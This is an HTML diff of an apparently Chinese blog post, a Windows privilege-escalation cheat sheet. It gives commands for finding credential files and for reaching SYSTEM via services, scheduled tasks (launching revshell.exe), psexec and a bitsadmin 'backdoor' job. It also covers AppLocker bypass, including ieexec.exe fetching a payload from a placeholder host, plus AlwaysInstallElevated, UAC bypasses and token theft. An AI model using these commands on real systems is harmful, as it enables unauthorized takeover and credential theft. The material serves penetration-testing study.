@@ -253,7 +253,7 @@
 
 <span id="more"></span>
 <hr>
-<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><h3 id="1-基础信息"><a href="#1-基础信息" class="headerlink" title="1. 基础信息"></a>1. 基础信息</h3><pre class="language-none"><code class="language-none">1）版本配置信息
+<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><h3 id="1-基础信息"><a href="#1-基础信息" class="headerlink" title="1. 基础信息"></a>1. 基础信息</h3><pre class="line-numbers language-none"><code class="language-none">1）版本配置信息
 
 systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;
 
@@ -382,9 +382,9 @@ C:\Windows\registration\crmlog
 C:\Windows\System32\com\dmp
 C:\Windows\SysWOW64\com\dmp
 C:\Windows\System32\fxstmp
-C:\Windows\SysWOW64\fxstmp</code></pre>
+C:\Windows\SysWOW64\fxstmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="2-密码信息"><a href="#2-密码信息" class="headerlink" title="2. 密码信息"></a>2. 密码信息</h3><pre class="language-none"><code class="language-none">1）SAM&#x2F;SYSTEM文件
+<h3 id="2-密码信息"><a href="#2-密码信息" class="headerlink" title="2. 密码信息"></a>2. 密码信息</h3><pre class="line-numbers language-none"><code class="language-none">1）SAM&#x2F;SYSTEM文件
 
 # Usually %SYSTEMROOT% &#x3D; C:\Windows # 文件所在位置
 %SYSTEMROOT%\repair\SAM
@@ -491,9 +491,9 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 11）数据流密码获取
 
 PS &gt; Get-Item -path flag.txt -Stream *
-PS &gt; Get-Content -path flag.txt -Stream Flag</code></pre>
+PS &gt; Get-Content -path flag.txt -Stream Flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="3-进程-x2F-服务信息"><a href="#3-进程-x2F-服务信息" class="headerlink" title="3. 进程&#x2F;服务信息"></a>3. 进程&#x2F;服务信息</h3><pre class="language-none"><code class="language-none">1）查看运行进程
+<h3 id="3-进程-x2F-服务信息"><a href="#3-进程-x2F-服务信息" class="headerlink" title="3. 进程&#x2F;服务信息"></a>3. 进程&#x2F;服务信息</h3><pre class="line-numbers language-none"><code class="language-none">1）查看运行进程
 
 tasklist &#x2F;v
 net start
@@ -530,53 +530,53 @@ reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
 dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;
-dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</code></pre>
+dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x01-通过服务创建提权"><a href="#0x01-通过服务创建提权" class="headerlink" title="0x01 通过服务创建提权"></a>0x01 通过服务创建提权</h2><p>介绍几种从admin权限提权到system权限的方法，本质上是采用了“劫持启动”的思想，通过创建一个系统任务，劫持系统以一个system权限来执行任意的目的</p>
-<h3 id="1-使用sc命令"><a href="#1-使用sc命令" class="headerlink" title="1. 使用sc命令"></a>1. 使用sc命令</h3><pre class="language-none"><code class="language-none">sc Create TestService1 binPath&#x3D; &quot;cmd &#x2F;c start&quot; type&#x3D; own type&#x3D; interact
-sc start TestService1</code></pre>
+<h3 id="1-使用sc命令"><a href="#1-使用sc命令" class="headerlink" title="1. 使用sc命令"></a>1. 使用sc命令</h3><pre class="line-numbers language-none"><code class="language-none">sc Create TestService1 binPath&#x3D; &quot;cmd &#x2F;c start&quot; type&#x3D; own type&#x3D; interact
+sc start TestService1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>创建服务后，启动该服务，会遇到报错，点击“查看消息”可以得到另一个类似screen的会话界面中，获得system权限</p>
 <p>注意：通过sc创建服务必须要有administrator权限，普通账户（非administrators组）无法创建服务</p>
 <h3 id="2-通过计划任务"><a href="#2-通过计划任务" class="headerlink" title="2. 通过计划任务"></a>2. 通过计划任务</h3><p>使用at命令（默认以system权限启动）：</p>
-<pre class="language-none"><code class="language-none"># Create a recurring task to execute every day at a specific time.
-C:\Windows\System32\at.exe at 10:00 &#x2F;interactive &#x2F;every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe</code></pre>
+<pre class="line-numbers language-none"><code class="language-none"># Create a recurring task to execute every day at a specific time.
+C:\Windows\System32\at.exe at 10:00 &#x2F;interactive &#x2F;every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>at启动的任务默认是非交互模式，如果希望以交互模式启动新进程和指令，创建服务，以system权限启动：</p>
-<pre class="language-none"><code class="language-none">schtasks &#x2F;Create &#x2F;TN TestService2 &#x2F;SC DAILY &#x2F;ST 00:36 &#x2F;TR notepad.exe &#x2F;RU SYSTEM可以使用schtasks命令</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;Create &#x2F;TN TestService2 &#x2F;SC DAILY &#x2F;ST 00:36 &#x2F;TR notepad.exe &#x2F;RU SYSTEM可以使用schtasks命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>查看服务状态：</p>
-<pre class="language-none"><code class="language-none">schtasks &#x2F;Query &#x2F;TN TestService2</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;Query &#x2F;TN TestService2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>删除服务：</p>
-<pre class="language-none"><code class="language-none">schtasks &#x2F;Delete &#x2F;TN TestService2 &#x2F;F</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;Delete &#x2F;TN TestService2 &#x2F;F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="3-利用psexec"><a href="#3-利用psexec" class="headerlink" title="3. 利用psexec"></a>3. 利用psexec</h3><p>psexec.exe可以被用来向远程服务器执行程序和指令，也可以被用在本地执行进程指令</p>
-<pre class="language-none"><code class="language-none">psexec.exe -accepteula -s -i -d notepad.exe
+<pre class="line-numbers language-none"><code class="language-none">psexec.exe -accepteula -s -i -d notepad.exe
 
 -s    Run the remote process in the System account. 
 -i    Run the program so that it interacts with the desktop of the specified session on the remote system. If no session is specified the process runs in the console session.
--d    Don&#39;t wait for process to terminate (non-interactive).</code></pre>
+-d    Don&#39;t wait for process to terminate (non-interactive).<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>注意：使用psexec会创建PSEXESVC服务，产生日志Event 4697、Event 7045、Event 4624和Event 4652，所以需要administrator权限启动</p>
 <h3 id="4-利用win32-API创建服务"><a href="#4-利用win32-API创建服务" class="headerlink" title="4. 利用win32 API创建服务"></a>4. 利用win32 API创建服务</h3><p>利用新建服务的进程权限都是system这一优势获得一个system的shell</p>
-<pre class="language-none"><code class="language-none">1. 新建一个services stup exe，实现windows service的基本接口，在start逻辑里负责向named pipe中随意写入一些bytes，目的是激活named pipe
+<pre class="line-numbers language-none"><code class="language-none">1. 新建一个services stup exe，实现windows service的基本接口，在start逻辑里负责向named pipe中随意写入一些bytes，目的是激活named pipe
 2. 真正的提权exe，要负责创建一个named pipe，同时连接上去，和services stup exe互通
 3. 通过ImpersonateNamedPipeClient、DuplicateTokenEx从services stup exe拷贝出system token
-4. 调用CreateProcessAsUser基于已获得的token创建一个新cmd.exe shell进程，进行本地提权</code></pre>
+4. 调用CreateProcessAsUser基于已获得的token创建一个新cmd.exe shell进程，进行本地提权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://github.com/xpn/getsystem-offline">https://github.com/xpn/getsystem-offline</a></p>
 <h2 id="0x02-利用bitadmins提取权"><a href="#0x02-利用bitadmins提取权" class="headerlink" title="0x02. 利用bitadmins提取权"></a>0x02. 利用bitadmins提取权</h2><p>bitadmins是用于文件下载的windows系统内置指令，但同时它还具有另一个方便的能力就是：“下载完毕后触发一次执行执行回调，并且是system权限”</p>
 <p><strong>1) 借助bitadmins回调执行功能启动新进程，跳过文件下载环节</strong></p>
 <p>bitadmins只有在文件下载成功后，才能接着执行其中的cmd命令，但是为了缩短执行命令的时间，减小下载文件的流量，可以把文件设置为本地文件，这样就可以跳过文件下载的环节，直接执行一个指令</p>
-<pre class="language-none"><code class="language-none">bitsadmin &#x2F;create backdoor
+<pre class="line-numbers language-none"><code class="language-none">bitsadmin &#x2F;create backdoor
 bitsadmin &#x2F;addfile backdoor %comspec%  %temp%\cmd.exe
 bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor &quot;%COMSPEC%&quot; &quot;cmd.exe &#x2F;c regedit.exe&quot; 
-bitsadmin &#x2F;Resume backdoor</code></pre>
+bitsadmin &#x2F;Resume backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>2) 劫持其他应用的bitadmins任务，向其GetNotifyCmdLine中植入恶意代码</strong></p>
 <p>bitadmins是系统updates底层使用的下载支持服务，除此之外，像chrome这种应用也会使用bitadmins进行应用更新，因此，可以通过劫持这些应用的回调GetNotifyCmdLine，向其中注入定制的代码，这样，每当应用进行升级或升级检查的时候，就会触发evil code</p>
-<pre class="language-none"><code class="language-none"> 查看现在都有哪些应用创建了bisadmins任务
+<pre class="line-numbers language-none"><code class="language-none"> 查看现在都有哪些应用创建了bisadmins任务
 bitsadmin &#x2F;list &#x2F;allusers &#x2F;verbose
 
 bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;
@@ -586,7 +586,7 @@ bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125
 bitsadmin.exe &#x2F;SetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125; &quot;%COMSPEC%&quot; &quot;cmd.exe &#x2F;c calc.exe&quot; 
  
 # 查看GUID
-bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;</code></pre>
+bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><em>refer:</em></p>
 <ul>
@@ -594,7 +594,7 @@ bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125
 <li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec</a></li>
 </ul>
 <h2 id="0x03-绕过AppLocker限制提权"><a href="#0x03-绕过AppLocker限制提权" class="headerlink" title="0x03 绕过AppLocker限制提权"></a>0x03 绕过AppLocker限制提权</h2><p>AppLocker本质是一个“黑&#x2F;白名单机制框架”，相比黑名单，白名单是它的主流用法，AppLocker 为管理员提供指定哪些用户可以运行特定应用程序的能力。AppLocker 允许管理员控制下列类型的应用程序：</p>
-<pre class="language-none"><code class="language-none">1) 可执行文件
+<pre class="line-numbers language-none"><code class="language-none">1) 可执行文件
 .exe
 .com
 
@@ -611,9 +611,9 @@ bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125
 
 4) DLL 文件
 .dll
-.ocx</code></pre>
+.ocx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="1-AppLocker局限性"><a href="#1-AppLocker局限性" class="headerlink" title="1. AppLocker局限性"></a>1. AppLocker局限性</h3><pre class="language-none"><code class="language-none">1) AppLocker无法控制内存中正在运行的进程：利用一些可信的进程或使用反射注入技术就可以做到绕过
+<h3 id="1-AppLocker局限性"><a href="#1-AppLocker局限性" class="headerlink" title="1. AppLocker局限性"></a>1. AppLocker局限性</h3><pre class="line-numbers language-none"><code class="language-none">1) AppLocker无法控制内存中正在运行的进程：利用一些可信的进程或使用反射注入技术就可以做到绕过
 
 2) DLL劫持: 除非有严格的DLL AppLocker规则，否则你就可以DLL劫持信任的应用程序
 
@@ -633,9 +633,9 @@ bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125
 
 通过rundll32调用javascript代码并执行任意代码
 
-通过regsvc32.exe执行sct代码</code></pre>
+通过regsvc32.exe执行sct代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="2-绕过Applocker方式"><a href="#2-绕过Applocker方式" class="headerlink" title="2. 绕过Applocker方式"></a>2. 绕过Applocker方式</h3><pre class="language-none"><code class="language-none">1）Placing files in writeable paths
+<h3 id="2-绕过Applocker方式"><a href="#2-绕过Applocker方式" class="headerlink" title="2. 绕过Applocker方式"></a>2. 绕过Applocker方式</h3><pre class="line-numbers language-none"><code class="language-none">1）Placing files in writeable paths
 
 C:\Windows\Tasks 
 C:\Windows\Temp 
@@ -688,7 +688,7 @@ msconfig即系统配置实用程序，是Microsoft System Configuration的缩写
 
 IEExec.exe应用程序是一个未记录的Microsoft.NET框架应用程序，它包含在.NET框架中。攻击者可以使用IEExec.exe应用程序作为主机来运行其他托管应用程序
 
-ieexec.exe http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;bypass.exe</code></pre>
+ieexec.exe http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;bypass.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x04-利用组策略提升权限"><a href="#0x04-利用组策略提升权限" class="headerlink" title="0x04 利用组策略提升权限"></a>0x04 利用组策略提升权限</h2><p><strong>开启AlwaysInstallElevated特权安装功能</strong></p>
 <p>开启AlwaysInstallElevated特权安装功能：</p>
@@ -701,18 +701,18 @@ ieexec.exe http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;bypass.exe</code></pre>
 </li>
 </ul>
 <p>此时会在注册表如下位置自动创建键值：</p>
-<pre class="language-none"><code class="language-none">[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”&#x3D;dword:00000001
+<pre class="line-numbers language-none"><code class="language-none">[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”&#x3D;dword:00000001
 
-[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”&#x3D;dword:00000001</code></pre>
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”&#x3D;dword:00000001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>如果获得了对注册表的访问权限，可以通过更改注册表来开启AlwaysInstallElevated（必须同时修改两处注册表键值），进而提升权限</p>
-<pre class="language-none"><code class="language-none">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated
+<pre class="line-numbers language-none"><code class="language-none">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated
 
-# 值全为1代表开启AlwaysInstallElevated，否则未开启</code></pre>
+# 值全为1代表开启AlwaysInstallElevated，否则未开启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后使用<a target="_blank" rel="noopener" href="https://github.com/LittleHann/PowerSploit/blob/master/Privesc/Privesc.psd1">powerup powershell tookkit</a>生成对应的.msi程序，完成提权添加用户的操作：</p>
-<pre class="language-none"><code class="language-none"># 将Privesc拷贝至&quot;$Env:windir\System32\WindowsPowerShell\v1.0\Modules&quot;
+<pre class="line-numbers language-none"><code class="language-none"># 将Privesc拷贝至&quot;$Env:windir\System32\WindowsPowerShell\v1.0\Modules&quot;
 # 导入moduel: 
 Import-Module Privesc
 # 检查是否开启AlwaysInstallElevated：
@@ -721,35 +721,35 @@ Get-RegistryAlwaysInstallElevated
 # 利用AlwaysInstallElevated添加用户
 Write-UserAddMSI
 # 运行后生成文件UserAdd.msi
-# 以普通用户权限运行这个UserAdd.msi，成功添加账户 </code></pre>
+# 以普通用户权限运行这个UserAdd.msi，成功添加账户 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x05-绕过UAC提权"><a href="#0x05-绕过UAC提权" class="headerlink" title="0x05 绕过UAC提权"></a>0x05 绕过UAC提权</h2><p>自Windows Vista开始，微软引入了完整性级别概念，用于防止”权限滥用“，其设计模型来自于Biba完整性模型基础上的上不可写，下不可读原则来保护数据完整性，权限由高到低分为：</p>
-<pre class="language-none"><code class="language-none">1. 系统级(system)
+<pre class="line-numbers language-none"><code class="language-none">1. 系统级(system)
 
 2. 管理员(High): 在Windows Vista之前的系统，默认创建的管理员账户即对应完整管理员(High)级别，这个级别基本没有限制，导致可以任意添加计划任务，写关键路径，读写关键注册表、创建服务、加载驱动等等
 
 3. 用户(Medium): 从Windows Vista开始创建的管理员账户均在用户(Medium)级别，当UAC(默认)开启的情况下，这个级别会有很多限制，仅当程序请求管理员权限，或是触发条件则弹窗询问用户授权。
 
-4. 受限(Low): 受限(Low)被应用于IE浏览器作为保护模式使用，其直接访问网页的进程会通过Host主进程代理操作系统资源，只有在Temp、Temporary、Internet Files、Cookies和Favorites目录下的几个特定低完整性目录可以进行写操作，同时启动其他进程时弹窗询问用户。</code></pre>
+4. 受限(Low): 受限(Low)被应用于IE浏览器作为保护模式使用，其直接访问网页的进程会通过Host主进程代理操作系统资源，只有在Temp、Temporary、Internet Files、Cookies和Favorites目录下的几个特定低完整性目录可以进行写操作，同时启动其他进程时弹窗询问用户。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>但由于微软出于兼容性、用户体验等的考虑，为减少UAC弹窗，设定了自动提权的机制，满足以下两个条件的程序，会自动提升权限</p>
-<pre class="language-none"><code class="language-none">1. 必须经过 Windows Publisher 数字签名
+<pre class="line-numbers language-none"><code class="language-none">1. 必须经过 Windows Publisher 数字签名
 2. 必须位于”安全目录“中，其中”安全目录“指的是普通用户(Medium)无权修改的，包括
     1) %SystemRoot%\System32（例如，\Windows\System32）
     2) 及其大多数子目录、%SystemRoot%\Ehome
-    3) 以及 %ProgramFiles% 下的少许目录（其中包括 Windows Defender 和 Windows 日记本）</code></pre>
+    3) 以及 %ProgramFiles% 下的少许目录（其中包括 Windows Defender 和 Windows 日记本）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>绕过UAC的方法的核心思想</p>
-<pre class="language-none"><code class="language-none">1. 要充分利用基于Windows设定的&quot;自动提升&quot;机制，因为只有这个唯一的通道是可以避开UAC的。
+<pre class="line-numbers language-none"><code class="language-none">1. 要充分利用基于Windows设定的&quot;自动提升&quot;机制，因为只有这个唯一的通道是可以避开UAC的。
 
 2. 显然不能或者非常难可以获得微软publisher的签名，所有只有寻找那些被系统“认可”的“具备自动提升权限”的程序去尝试“注入”或“劫持”，而“注入”这些核心进程是非常困难的，因此剩下的可探索的方向就是“劫持”
 
 3. 首先需要列出系统上存在的具备“自动提升权限”的进程，并找到它们存在dll的目录及文件名，这些dll文件名就是我们将要劫持替换的文件。
 
-4. 系统程序所在的目录往往都是核心目录，向这种目录写入dll同样是一个困难，这里依然需要使用“劫持”思想，寻找某个系统原生的程序，利用它的某个功能，实现dll的释放和替换。</code></pre>
+4. 系统程序所在的目录往往都是核心目录，向这种目录写入dll同样是一个困难，这里依然需要使用“劫持”思想，寻找某个系统原生的程序，利用它的某个功能，实现dll的释放和替换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="1-DLL劫持"><a href="#1-DLL劫持" class="headerlink" title="1. DLL劫持"></a>1. DLL劫持</h3><p>将DLL复制到 sysprep目录进行权限提升。实现这一目的的两种最流行的方式是：使用一个IFileOperation COM对象，或者使用Wusa.exe和它的“extract”选项。目前，Invoke-PsUACme使用的是Wusa方法。因为Wusa设置为了自动提升，所以可以用它来提取一个cab文件到sysprep目录</p>
-<pre class="language-none"><code class="language-none"># 通过makecab生成一个cab文件，cab中包含我们指定的恶意dll文件
+<pre class="line-numbers language-none"><code class="language-none"># 通过makecab生成一个cab文件，cab中包含我们指定的恶意dll文件
 makecab C:\your_dll_path.dll C:\any_path_is_ok.cab
 
 # 执行wusa将cab文件中的dll释放到指定目录(例如&quot;C:\Windows\System32\Sysprep\&quot;)，这一步即是劫持的过程
@@ -759,49 +759,49 @@ makecab C:\your_dll_path.dll C:\any_path_is_ok.cab
 &amp; C:\Windows\System32\Sysprep\sysprep.exe
 
 # 使用nishang的Invoke-PsUACme可以自动完成这所有过程
-Invoke-PsUACme -method oobe -Payload &quot;powershell -noexit -c Get-Process&quot;</code></pre>
+Invoke-PsUACme -method oobe -Payload &quot;powershell -noexit -c Get-Process&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
 <h3 id="2-CMSTP配置VPN功能滥用"><a href="#2-CMSTP配置VPN功能滥用" class="headerlink" title="2. CMSTP配置VPN功能滥用"></a>2. CMSTP配置VPN功能滥用</h3><p>vpn配置程序自身提供了一个功能”RunPreSetupCommandsSection”，提供在安装开始前提供了一个执行指令的回调接口</p>
 <p>把.inf文件放置在目录下，执行该指令</p>
-<pre class="language-none"><code class="language-none">C:&#x2F;Windows&#x2F;System32&#x2F;cmstp.exe C:\Users\Administrator\Desktop\poc\UACBypass.inf &#x2F;au</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">C:&#x2F;Windows&#x2F;System32&#x2F;cmstp.exe C:\Users\Administrator\Desktop\poc\UACBypass.inf &#x2F;au<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>指令过程中会弹出一个UI窗口需要点击确认，可以用powershell脚本的sendkey模拟按键来完成一键自动化UAC提权</p>
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86685">https://www.anquanke.com/post/id/86685</a></p>
-<h3 id="3-注册表劫持"><a href="#3-注册表劫持" class="headerlink" title="3. 注册表劫持"></a>3. 注册表劫持</h3><pre class="language-none"><code class="language-none">Eventvwr.exe - Displays Windows Event Logs in a GUI window
+<h3 id="3-注册表劫持"><a href="#3-注册表劫持" class="headerlink" title="3. 注册表劫持"></a>3. 注册表劫持</h3><pre class="line-numbers language-none"><code class="language-none">Eventvwr.exe - Displays Windows Event Logs in a GUI window
 
-在&quot;eventvwr.exe&quot;启动期间，eventvwr.exe检查注册表值HKCU\Software\Classes\msc file\shell\open\command以查找mmc.exe的位置，该文件用于打开eventvwr.msc保存的控制台文件。如果将另一个二进制文件或脚本的位置添加到此注册表值，则它将作为高完整性进程执行，而不会向用户显示UAC提示</code></pre>
+在&quot;eventvwr.exe&quot;启动期间，eventvwr.exe检查注册表值HKCU\Software\Classes\msc file\shell\open\command以查找mmc.exe的位置，该文件用于打开eventvwr.msc保存的控制台文件。如果将另一个二进制文件或脚本的位置添加到此注册表值，则它将作为高完整性进程执行，而不会向用户显示UAC提示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</a></p>
 <h2 id="0x06-Token-x2F-Hash窃取与提权"><a href="#0x06-Token-x2F-Hash窃取与提权" class="headerlink" title="0x06 Token&#x2F;Hash窃取与提权"></a>0x06 Token&#x2F;Hash窃取与提权</h2><h3 id="1-通过incognito枚举token"><a href="#1-通过incognito枚举token" class="headerlink" title="1. 通过incognito枚举token"></a>1. 通过incognito枚举token</h3><p>Windows有两种类型的Token：</p>
-<pre class="language-none"><code class="language-none">a. Delegation token(授权令牌)：用于交互会话登录(例如本地用户直接登录、远程桌面登录)。具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效
+<pre class="line-numbers language-none"><code class="language-none">a. Delegation token(授权令牌)：用于交互会话登录(例如本地用户直接登录、远程桌面登录)。具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效
 
-b. Impersonation token(模拟令牌)：用于非交互登录(利用net use访问共享文件夹) </code></pre>
+b. Impersonation token(模拟令牌)：用于非交互登录(利用net use访问共享文件夹) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>两种token都只在系统重启后清除，通过incognito.exe枚举token list</p>
-<pre class="language-none"><code class="language-none">incognito.exe list_tokens -u</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">incognito.exe list_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>利用该token执行calc.exe</p>
-<pre class="language-none"><code class="language-none"># 通过任务管理器查看到进程的账户名为 hacker
-incognito.exe execute -c &quot;iZxkpes3z6p6ajZ\hacker&quot; calc.exe</code></pre>
+<pre class="line-numbers language-none"><code class="language-none"># 通过任务管理器查看到进程的账户名为 hacker
+incognito.exe execute -c &quot;iZxkpes3z6p6ajZ\hacker&quot; calc.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>提权至system：</p>
-<pre class="language-none"><code class="language-none">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
